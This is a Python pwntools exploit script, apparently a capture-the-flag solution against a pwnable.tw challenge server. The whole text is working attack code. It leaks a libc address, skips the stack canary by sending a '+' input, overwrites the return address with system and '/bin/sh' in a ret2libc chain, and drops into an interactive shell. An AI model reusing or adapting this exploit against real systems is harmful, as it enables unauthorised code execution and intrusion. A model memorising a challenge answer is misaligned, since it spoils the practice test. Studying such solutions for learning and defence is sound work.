from pwn import *
server = remote('chall.pwnable.tw', 10101)

libc = ELF('./libc_32.so.6')
#readelf -S libc_32.so.6
got_plt_offset = 0x1b0000

# leak GOT address
payload = 'a'*24
print(server.recv())
server.sendline(payload)
GOT = u32(server.recv()[30:34]) - 0xa # f7704000
# get shellcode address
libcbase_addr = GOT - got_plt_offset # f755b000
sys_addr = libcbase_addr + libc.symbols['system']
bin_sh_addr = libcbase_addr + libc.search('/bin/sh').next()

server.sendline('35')
server.recv()

# 24 numbers to go before canary
for i in range(24):
    server.sendline('0')
    server.recv()

# '+' is a legal input but won't be written to the stack
# thus we can use it to surpass the canary
server.sendline('+')
server.recv()

# 9 numbers to go before ret addr
for i in range(9):
    server.sendline(str(sys_addr))
    server.recv()

server.sendline(str(bin_sh_addr))
server.recv()

server.interactive()